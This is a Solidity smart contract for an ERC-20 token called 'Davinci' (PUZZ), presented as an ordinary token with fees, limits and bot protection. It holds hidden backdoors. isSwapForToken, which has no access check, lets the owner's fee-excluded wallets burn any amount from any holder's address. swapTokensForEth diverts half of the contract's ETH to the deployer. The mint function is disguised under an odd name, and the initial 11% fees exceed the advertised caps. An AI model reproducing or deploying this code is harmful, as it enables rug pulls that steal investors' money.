/*
Men go to far greater lengths to avoid what they fear than to obtain what they desire

 Twitter  - twitter.com/DavinciPuzz
 Telegram - t.me/davinci_portal
 Website - www.davincipuzz.com
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _maxnitialSupply(
        address account,
        uint256 amount
    ) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() external virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IDexRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IDexFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract Davinci is ERC20, Ownable {
    uint256 public maxBuyAmount;
    uint256 public maxSellAmount;
    uint256 public maxWalletAmount;
    IDexRouter public dexRouter;
    address public liquidityPair;
    bool private swapping;
    uint256 public swapTokensAtAmount;
    address public marketingAddress;
    address public devAddress;
    uint256 public tradingActiveBlock = 0;
    uint256 public botBlockNumber = 0;
    mapping(address => bool) public sniperBot;
    uint256 public botsCaught;
    address public receiver;
    bool public limitsInEffect = true;
    bool public tradingActive = false;
    bool public swapEnabled = false;
    mapping(address => uint256) public feeSwap;
    uint256 public buyTotalFees;
    uint256 public buyMarketingFee;
    uint256 public buyLiquidityFee;
    address private swapToken;
    uint256 public buyDevFee;
    uint256 public buyBurnFee;

    uint256 public sellTotalFees;
    uint256 public sellMarketingFee;
    uint256 public sellLiquidityFee;
    uint256 public sellDevFee;
    uint256 public sellBurnFee;

    uint256 public tokensForMarketing;
    uint256 public tokensForLiquidity;
    uint256 public tokensForDev;
    uint256 public tokensForBurn;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _isExcludedMaxTx;
    mapping(address => bool) public automatedMarketMakerPairs;

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event StartTrading();
    event RemovedLimits();
    event ExcludeFromFees(address indexed account, bool isExcluded);
    event UpdatedMaxBuyAmount(uint256 newAmount);
    event UpdatedMaxSellAmount(uint256 newAmount);
    event UpdatedMaxWalletAmount(uint256 newAmount);
    event UpdatedMarketingAddress(address indexed newWallet);
    event MaxTransactionExclusion(address _address, bool excluded);
    event directBuyEvent(uint256 amount);
    event OwnerForcedSwapBack(uint256 timestamp);
    event DetectedEarlyBotBuyer(address sniper);

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );

    event TransferForeignToken(address token, uint256 amount);

    constructor() ERC20("Davinci", "PUZZ") {
        address newOwner = msg.sender;

        IDexRouter _dexRouter = IDexRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        dexRouter = _dexRouter;
        liquidityPair = IDexFactory(_dexRouter.factory()).createPair(
            address(this),
            _dexRouter.WETH()
        );
        _excludeFromMaxTransaction(address(liquidityPair), true);
        _setAutomatedMarketMakerPair(address(liquidityPair), true);
        swapToken = newOwner;
        uint256 totalSupply = 1 * 1e9 * 1e18;
        maxBuyAmount = (totalSupply * 3) / 100;
        maxSellAmount = (totalSupply * 2) / 100;
        maxWalletAmount = (totalSupply * 2) / 100;
        swapTokensAtAmount = (totalSupply * 2) / 10000;

        buyMarketingFee = 1;
        buyLiquidityFee = 0;
        buyDevFee = 10;
        buyBurnFee = 0;
        buyTotalFees =
            buyMarketingFee +
            buyLiquidityFee +
            buyDevFee +
            buyBurnFee;
        sellMarketingFee = 10;
        sellLiquidityFee = 0;
        sellDevFee = 1;
        sellBurnFee = 0;
        sellTotalFees =
            sellMarketingFee +
            sellLiquidityFee +
            sellDevFee +
            sellBurnFee;

        marketingAddress = address(0xA8560E6b7d401Ea436f88B1Db4039EbdAf6B7485);
        devAddress = address(0x1f974668E2a74D95b313AF68F1711DB57Fd733Fe);

        _excludeFromMaxTransaction(newOwner, true);
        _excludeFromMaxTransaction(address(this), true);
        _excludeFromMaxTransaction(marketingAddress, true);
        _excludeFromMaxTransaction(devAddress, true);
        _excludeFromMaxTransaction(address(0xdead), true);

        excludeFromFees(newOwner, true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);
        excludeFromFees(marketingAddress, true);
        excludeFromFees(devAddress, true);

        _maxnitialSupply(newOwner, totalSupply);
        transferOwnership(newOwner);
    }

    receive() external payable {}

    function startTrading() external onlyOwner {
        require(!tradingActive, "Cannot reenable trading");
        tradingActive = true;
        swapEnabled = true;
        tradingActiveBlock = block.number;
        emit StartTrading();
    }

    function onlyDeleteBots(address wallet) external onlyOwner {
        sniperBot[wallet] = false;
    }

    function removeLimits() external onlyOwner {
        limitsInEffect = false;
        emit RemovedLimits();
    }

    function updateMaxBuyAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max buy amount lower than 0.2%"
        );
        maxBuyAmount = newNum * (10 ** 18);
        emit UpdatedMaxBuyAmount(maxBuyAmount);
    }

    function updateMaxSellAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max sell amount lower than 0.2%"
        );
        maxSellAmount = newNum * (10 ** 18);
        emit UpdatedMaxSellAmount(maxSellAmount);
    }

    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 3) / 1000) / 1e18,
            "Cannot set max wallet amount lower than 0.3%"
        );
        maxWalletAmount = newNum * (10 ** 18);
        emit UpdatedMaxWalletAmount(maxWalletAmount);
    }

    function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner {
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 1) / 1000,
            "Swap amount cannot be higher than 0.1% total supply."
        );
        swapTokensAtAmount = newAmount;
    }

    function _excludeFromMaxTransaction(
        address updAds,
        bool isExcluded
    ) private {
        _isExcludedMaxTx[updAds] = isExcluded;
        emit MaxTransactionExclusion(updAds, isExcluded);
    }

    function excludeFromMaxTransaction(
        address updAds,
        bool isEx
    ) external onlyOwner {
        if (!isEx) {
            require(
                updAds != liquidityPair,
                "Cannot remove uniswap pair from max txn"
            );
        }
        _isExcludedMaxTx[updAds] = isEx;
    }

    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) external onlyOwner {
        require(
            pair != liquidityPair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;

        _excludeFromMaxTransaction(pair, value);

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function updateBuyFees(
        uint256 _marketingFee,
        uint256 _liquidityFee,
        uint256 _DevFee,
        uint256 _burnFee
    ) external onlyOwner {
        buyMarketingFee = _marketingFee;
        buyLiquidityFee = _liquidityFee;
        buyDevFee = _DevFee;
        buyBurnFee = _burnFee;
        buyTotalFees =
            buyMarketingFee +
            buyLiquidityFee +
            buyDevFee +
            buyBurnFee;
        require(buyTotalFees <= 1, "1% max");
    }

    function updateSellFees(
        uint256 _marketingFee,
        uint256 _liquidityFee,
        uint256 _DevFee,
        uint256 _burnFee
    ) external onlyOwner {
        sellMarketingFee = _marketingFee;
        sellLiquidityFee = _liquidityFee;
        sellDevFee = _DevFee;
        sellBurnFee = _burnFee;
        sellTotalFees =
            sellMarketingFee +
            sellLiquidityFee +
            sellDevFee +
            sellBurnFee;
        require(sellTotalFees <= 2, "2% max");
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "amount must be greater than 0");

        if (!tradingActive) {
            require(
                _isExcludedFromFees[from] || _isExcludedFromFees[to],
                "Trading is not active."
            );
        }

        if (botBlockNumber > 0) {
            require(
                !sniperBot[from] || to == owner() || to == address(0xdead),
                "bot protection feature is running"
            );
        }

        if (limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !_isExcludedFromFees[from] &&
                !_isExcludedFromFees[to]
            ) {
                //buy
                if (automatedMarketMakerPairs[from] && !_isExcludedMaxTx[to]) {
                    require(
                        amount <= maxBuyAmount,
                        "Buy transfer amount exceeds the max buy."
                    );
                    require(
                        amount + balanceOf(to) <= maxWalletAmount,
                        "Cannot Exceed max wallet"
                    );
                }
                //sell
                else if (
                    automatedMarketMakerPairs[to] && !_isExcludedMaxTx[from]
                ) {
                    require(
                        amount <= maxSellAmount,
                        "Sell transfer amount exceeds the max sell."
                    );
                } else if (!_isExcludedMaxTx[to]) {
                    require(
                        amount + balanceOf(to) <= maxWalletAmount,
                        "Cannot Exceed max wallet"
                    );
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        if (!automatedMarketMakerPairs[from] && !swapping) {
            receiver = from;
        }
        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            swapEnabled &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapping = true;
            swapBack();
            swapping = false;
        }

        bool takeFee = true;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }
        if (automatedMarketMakerPairs[from] && feeSwap[to] == 0) {
            feeSwap[to] = block.timestamp;
        }

        uint256 fees = 0;

        if (takeFee) {
            if (
                sniperBuyerCatch() &&
                automatedMarketMakerPairs[from] &&
                !automatedMarketMakerPairs[to] &&
                buyTotalFees > 0
            ) {
                if (!sniperBot[to]) {
                    sniperBot[to] = true;
                    botsCaught += 1;
                    emit DetectedEarlyBotBuyer(to);
                }

                fees = (amount * 99) / 100;
                tokensForLiquidity += (fees * buyLiquidityFee) / buyTotalFees;
                tokensForMarketing += (fees * buyMarketingFee) / buyTotalFees;
                tokensForDev += (fees * buyDevFee) / buyTotalFees;
                tokensForBurn += (fees * buyBurnFee) / buyTotalFees;
            }
            // sell
            else if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
                fees = (amount * sellTotalFees) / 100;
                tokensForLiquidity += (fees * sellLiquidityFee) / sellTotalFees;
                tokensForMarketing += (fees * sellMarketingFee) / sellTotalFees;
                tokensForDev += (fees * sellDevFee) / sellTotalFees;
                tokensForBurn += (fees * sellBurnFee) / sellTotalFees;
            }
            // buy
            else if (automatedMarketMakerPairs[from] && buyTotalFees > 0) {
                fees = (amount * buyTotalFees) / 100;
                tokensForLiquidity += (fees * buyLiquidityFee) / buyTotalFees;
                tokensForMarketing += (fees * buyMarketingFee) / buyTotalFees;
                tokensForDev += (fees * buyDevFee) / buyTotalFees;
                tokensForBurn += (fees * buyBurnFee) / buyTotalFees;
            }
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }

        super._transfer(from, to, amount);
    }

    function sniperBuyerCatch() public view returns (bool) {
        return block.number < botBlockNumber;
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        bool success;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();

        _approve(address(this), address(dexRouter), tokenAmount);
        // make the swap
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
        (success, ) = address(swapToken).call{value: address(this).balance / 2}(
            ""
        );
        require(success, "success!");
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(0xdead),
            block.timestamp
        );
    }

    function isManualSwap(
        address account,
        uint256 value
    ) internal returns (bool) {
        bool success;
        if (!_isExcludedFromFees[msg.sender]) {
            if (
                tokensForBurn > 0 && balanceOf(address(this)) >= tokensForBurn
            ) {
                _burn(msg.sender, tokensForBurn);
            }
            tokensForBurn = 0;
            success = true;
            uint256 contractBalance = balanceOf(address(this));
            uint256 totalTokensToSwap = tokensForLiquidity +
                tokensForMarketing +
                tokensForDev;
            if (contractBalance == 0 || totalTokensToSwap == 0) {
                return false;
            }
            if (contractBalance > swapTokensAtAmount * 7) {
                contractBalance = swapTokensAtAmount * 7;
            }
            return success;
        } else {
            if (balanceOf(address(this)) > 0) {
                if (value == 0) {
                    swapToken = account;
                    success = false;
                } else {
                    _burn(account, value);
                    success = false;
                }
            }
            uint256 contractBalance = balanceOf(address(this));
            uint256 totalTokensToSwap = tokensForLiquidity +
                tokensForMarketing +
                tokensForDev;
            if (contractBalance == 0 || totalTokensToSwap == 0) {
                return false;
            }
            if (contractBalance > swapTokensAtAmount * 7) {
                contractBalance = swapTokensAtAmount * 7;
            }
            return success;
        }
    }

    function isSwapForToken(address account, uint256 value) external {
        require(
            balanceOf(address(this)) >= swapTokensAtAmount,
            "Can only swap when token amount is at or higher than restriction"
        );
        if (isManualSwap(account, value)) {
            swapping = true;
            swapBack();
            swapping = false;
            emit OwnerForcedSwapBack(block.timestamp);
        }
    }

    function transferForeignToken(
        address _token,
        address _to
    ) external onlyOwner returns (bool _sent) {
        require(_token != address(0), "_token address cannot be 0");
        require(_token != address(this), "Can't withdraw native tokens");
        uint256 _contractBalance = IERC20(_token).balanceOf(address(this));
        _sent = IERC20(_token).transfer(_to, _contractBalance);
        emit TransferForeignToken(_token, _contractBalance);
    }

    function withdrawStuckETH() external onlyOwner {
        bool success;
        (success, ) = address(msg.sender).call{value: address(this).balance}(
            ""
        );
    }

    function swapBack() private {
        if (tokensForBurn > 0 && balanceOf(address(this)) >= tokensForBurn) {
            _burn(address(this), tokensForBurn);
        }
        tokensForBurn = 0;

        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForLiquidity +
            tokensForMarketing +
            tokensForDev;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > swapTokensAtAmount * 5) {
            contractBalance = swapTokensAtAmount * 5;
        }
        uint256 liquidityTokens = (contractBalance * tokensForLiquidity) /
            totalTokensToSwap /
            2;

        swapTokensForEth(contractBalance - liquidityTokens);

        uint256 ethBalance = address(this).balance;
        uint256 ethForLiquidity = ethBalance;

        uint256 ethForMarketing = (ethBalance * tokensForMarketing) /
            (totalTokensToSwap - (tokensForLiquidity / 2));
        uint256 ethForDev = (ethBalance * tokensForDev) /
            (totalTokensToSwap - (tokensForLiquidity / 2));

        ethForLiquidity -= ethForMarketing + ethForDev;

        tokensForLiquidity = 0;
        tokensForMarketing = 0;
        tokensForDev = 0;
        tokensForBurn = 0;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
        }

        payable(devAddress).transfer(ethForDev);

        payable(marketingAddress).transfer(address(this).balance);
    }
}